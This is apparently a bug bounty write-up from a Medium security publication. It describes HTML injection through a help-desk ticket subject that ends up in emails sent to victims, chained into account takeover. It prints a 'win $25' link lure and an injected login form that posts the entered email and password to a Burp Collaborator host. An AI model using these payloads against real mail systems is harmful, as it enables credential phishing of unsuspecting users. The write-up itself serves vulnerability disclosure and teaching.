---
title: Cracking ATO via Email HTML Injection
url: https://infosecwriteups.com/cracking-ato-via-email-html-injection-edd19c8e1b8f?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-11-15
fetch_date: 2025-10-06T19:17:43.557468
---

# Cracking ATO via Email HTML Injection

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fedd19c8e1b8f&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcracking-ato-via-email-html-injection-edd19c8e1b8f&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcracking-ato-via-email-html-injection-edd19c8e1b8f&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-edd19c8e1b8f---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-edd19c8e1b8f---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Cracking ATO via Email HTML Injection

[![cryptoshant🇮🇳](https://miro.medium.com/v2/resize:fill:64:64/1*WB_W42RWlz5rAUWNCTByiw.png)](https://medium.com/%40dsmodi484?source=post_page---byline--edd19c8e1b8f---------------------------------------)

[cryptoshant🇮🇳](https://medium.com/%40dsmodi484?source=post_page---byline--edd19c8e1b8f---------------------------------------)

3 min read

·

Oct 12, 2024

--

Listen

Share

Hello hackers, today in this write-up I am going to share how I find HTML injection in email in one of the self hosted target. And to show impact I chained it to ATO.

Press enter or click to view image in full size

![]()

Thanks copilot

So after selecting target I simply find all the subdomains of the main site as it is a wildcard. So let’s called my target website as ***\*.target.com.*** Now after finding almost 20+ live subdomains I visit every subdomain and I find out subdomain like **help.target.com.**

Now there is a option to submit a ticket. I visit that page and this page will take this many input fields from users.

1. **Requester => which take users email**
2. **Name**
3. **subject**
4. **Description**

Now attacker add victim email to this user email and inject below payload in subject and simply click on submit.

> **Payload:**
>
> **<a href=”**[**https://google.com**](https://google.com/)**" style=”color: red; font-size: 20px; font-weight: bold; text-decoration: none;”>Click here to win $25</a>**

after submitting user gets the email that they have created the ticket. Now users say that he is not created so he tries to cancel the ticket. Now he got an email with our malicious payloads. like the below screenshot.

Press enter or click to view image in full size

![]()

Htmli inject successfully

After submitting this bug to company and posting about this bug on LinkedIn some people told me to increase the impact by adding login form in place of simply open redirect and try to takeover user account. So I follow their advice and make login form to make login form I use this below payload:

```
<form action="https://burpcolloborator.com">Login for security:<br>
  <label for="u">Email:
  <input type="text" id="u" name="u"><br>
  <label for="p">Pass:
  <input type="password" id="p" name="p"><br>
  <input type="submit" value="ok">
```

due to some length issue during executing payload in email I make some changes like not complete **</label>** and some sort name in **id** and **value** parameter. And after putting this payload in the subject section the mail looks something like this:

Press enter or click to view image in full size

![]()

Payload with login form

As I add my burpcolloborator in action field in payload so if user add their email and pass and press ok then attacker gets users email and password in their collaborator something like this:

Press enter or click to view image in full size

![]()

User name & password leaking

You can clearly see that here for testing I enter username as **tirth** and password as **password** and we successfully takeover user account. And again submit to company with more impact of this bug.

**Little Advice: If you found HTMLI in email try to create more impact like by adding form or anything you can try but always show impact to companies.😉**

Unfortunately, company already know about this issue 😥 and they are working on fixing so they give me response like this:

Press enter or click to view image in full size

![]()

But this is a part of bug bounty any ways I hope you learn something new from this write-up. Please give your feedback I will try to solve your issues if any and if you found this helpful then don’t forget to give clap and follow for more.

Thanks for reading I will see you in next one.

**Follow me:-** [**https://linktr.ee/dishantmodi**](https://linktr.ee/dishantmodi)

[Vulnerability](https://medium.com/tag/vulnerability?source=post_page-----edd19c8e1b8f---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----edd19c8e1b8f---------------------------------------)

[HTML](https://medium.com/tag/html?source=post_page-----edd19c8e1b8f---------------------------------------)

[Injection](https://medium.com/tag/injection?source=post_page-----edd19c8e1b8f---------------------------------------)

[Email](https://medium.com/tag/email?source=post_page-----edd19c8e1b8f---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--edd19c8e1b8f---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--edd19c8e1b8f---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--edd19c8e1b8f---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--edd19c8e1b8f---------------------------------------)

·[Last published 4 hours ago](/baby-dfc2547dc387?source=post_page---post_publication_info--edd19c8e1b8f---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow

[![cryptoshant🇮🇳](https://miro.medium.com/v2/resize:fill:96:96/1*WB_W42RWlz5rAUWNCTByiw.png)](https://medium.com/%40dsmodi484?source=post_page---post_author_info--edd19c8e1b8f---------------------------------------)

[![cryptoshant🇮🇳](https://miro.medium.com/v2/resize:fill:128:128/1*WB_W42RWlz5rAUWNCTByiw.png)](https://medium.com/%40dsmodi484?source=post_page---post_author_info--edd19...